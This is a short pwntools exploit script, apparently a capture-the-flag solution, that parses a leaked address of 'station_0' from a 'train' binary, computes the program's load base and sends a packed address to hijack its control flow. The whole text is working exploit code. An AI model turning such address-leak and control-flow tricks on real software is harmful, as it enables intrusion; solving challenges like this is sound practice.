from pwn import *

elf = context.binary = ELF('./train')
context.log_level = 'debug'
context.endian = 'big'
# p = remote('tcp.ybn.sg', 24281)
p = process()

ret = 0x0000000000001016

p.recvline()
p.recvline()
p.recvline()

station0 = p.recvline()
station0 = station0.split(b':')[-1].strip()
station0 = int(station0, 16)
log.success('station0 address: {}'.format(hex(station0)))

elf.address = station0 - elf.sym['station_0']
log.success('ELF address: {}'.format(hex(elf.address)))

p.recvuntil('>>')
# p.send(p64(elf.sym['station_0']).strip(b'\x00'))
p.sendline(p64(elf.sym['station_0']).strip(b'\x00'))

# print(p.recvall().decode())
print(p.recvline())
